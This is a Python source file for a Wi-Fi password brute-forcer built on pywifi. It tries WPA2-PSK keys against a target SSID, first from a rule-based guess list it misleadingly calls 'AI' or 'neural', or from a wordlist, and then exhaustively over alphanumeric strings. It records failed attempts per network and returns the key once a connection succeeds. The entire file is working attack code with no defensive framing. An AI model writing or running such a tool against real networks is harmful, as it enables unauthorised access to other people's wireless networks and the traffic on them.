import time
import pywifi
import random
import os
import string
from itertools import product
from pywifi import PyWiFi, const, Profile
from utils.logger import logger

class BruteEngine:
    def __init__(self):
        self.wifi = PyWiFi()
        self.iface = self.wifi.interfaces()[0]
        self.is_running = False
        self.current_password = ""
        self.progress = 0
        self.attempt_count = 0
        self.brute_mode = "AI"
        self.ai_logs = []
        self.tried_passwords = set()
        self.history_file = ""
        
        # Ensure data directory exists
        if not os.path.exists('data'):
            os.makedirs('data')

    def _load_history(self, ssid):
        # Sanitize SSID for filename
        clean_ssid = "".join([c for c in ssid if c.isalnum() or c in (' ', '_')]).rstrip()
        self.history_file = os.path.abspath(f"data/history_{clean_ssid.replace(' ', '_')}.txt")
        self.tried_passwords = set()
        if os.path.exists(self.history_file):
            try:
                with open(self.history_file, 'r', encoding='utf-8') as f:
                    self.tried_passwords = set(line.strip() for line in f.readlines() if line.strip())
            except Exception as e:
                logger.error(f"Error loading history: {e}")
        
        msg = f"DATABASE: {len(self.tried_passwords)} previous attempts loaded."
        print(f"[*] {msg} path: {self.history_file}")
        self.ai_logs.append(msg)

    def _save_attempt(self, password):
        if not password or password in self.tried_passwords:
            return
        self.tried_passwords.add(password)
        try:
            with open(self.history_file, 'a', encoding='utf-8') as f:
                f.write(f"{password}\n")
        except Exception as e:
            logger.error(f"Error saving history: {e}")

    def test_password(self, ssid, password):
        if not self.is_running: return False
        
        # Immediate skip if already tried
        if password in self.tried_passwords:
            return False

        self.iface.disconnect()
        time.sleep(0.3)
        
        profile = Profile()
        profile.ssid = ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = password
        
        self.iface.remove_all_network_profiles()
        tmp_profile = self.iface.add_network_profile(profile)
        
        self.iface.connect(tmp_profile)
        time.sleep(1.2)
        
        connected = (self.iface.status() == const.IFACE_CONNECTED)
        if not connected:
            self._save_attempt(password)
        return connected

    def run_brute_force(self, ssid, wordlist_path, mode="AI"):
        self.is_running = True
        self.brute_mode = mode
        self.ai_logs = []
        self.attempt_count = 0
        self._load_history(ssid)
        
        try:
            # 1. Prepare candidate list ensuring NO DUPLICATES
            passwords = []
            if mode == "AI":
                self.ai_logs.append("STRATEGY: NEURAL SMART GUESSING")
                # Add neural patterns
                base_words = [ssid, "admin", "password", "wifi", "internet", "12345678"]
                years = ["2023", "2024", "2025", "2026"]
                suffixes = ["!", "@", "#", "123", "888"]
                for word in base_words:
                    passwords.append(word)
                    passwords.append(f"{word}123")
                    for year in years: passwords.append(f"{word}{year}")
                    for suff in suffixes: passwords.append(f"{word}{suff}")
                
                leet_map = {'a': '4', 'e': '3', 'i': '1', 'o': '0', 's': '5', 't': '7'}
                leeted = "".join([leet_map.get(c.lower(), c) for c in ssid])
                passwords.append(leeted)
                passwords.append(f"{leeted}123")
                
            elif mode == "DICTIONARY":
                self.ai_logs.append("STRATEGY: STANDARD DICTIONARY")
                if os.path.exists(wordlist_path):
                    with open(wordlist_path, 'r', encoding='utf-8') as f:
                        passwords += [line.strip() for line in f.readlines()]

            # Pure Deduplication
            passwords = [p for p in passwords if p and p not in self.tried_passwords]
            seen = set()
            passwords = [x for x in passwords if not (x in seen or seen.add(x))]

            # 2. Main Execution Loop
            # Dictionary/AI phase
            total_list = len(passwords)
            for i, pwd in enumerate(passwords):
                if not self.is_running: break
                self.attempt_count += 1
                self.current_password = pwd
                self.progress = int(((i+1)/total_list) * 100) if total_list > 0 else 50
                
                self.ai_logs.append(f"Attempt {self.attempt_count}: {pwd}")
                if len(self.ai_logs) > 6: self.ai_logs.pop(0)

                if self.test_password(ssid, pwd):
                    self.ai_logs.append(f"SUCCESS! PASSWORD FOUND: {pwd}")
                    self.is_running = False
                    return pwd

            # 3. Final Exhaustive mode if success not found (The "Loop Forever" part)
            self.ai_logs.append("STRATEGY: INFINITE BRUTE FORCE (Exhaustive)")
            chars = string.ascii_uppercase + string.digits + string.ascii_lowercase
            for length in range(1, 20):
                if not self.is_running: break
                for p in product(chars, repeat=length):
                    if not self.is_running: break
                    pwd = "".join(p)
                    
                    if pwd in self.tried_passwords:
                        continue # Strict deduplication skip
                        
                    self.attempt_count += 1
                    self.current_password = pwd
                    self.progress = (self.attempt_count % 101)
                    
                    self.ai_logs.append(f"Attempt {self.attempt_count}: {pwd}")
                    if len(self.ai_logs) > 6: self.ai_logs.pop(0)

                    if self.test_password(ssid, pwd):
                        self.is_running = False
                        return pwd
            
            self.is_running = False
            return None
        except Exception as e:
            logger.error(f"BruteForce Fatal Error: {e}")
            self.ai_logs.append(f"FATAL ERROR: {str(e)[:50]}...")
            self.is_running = False
            return None
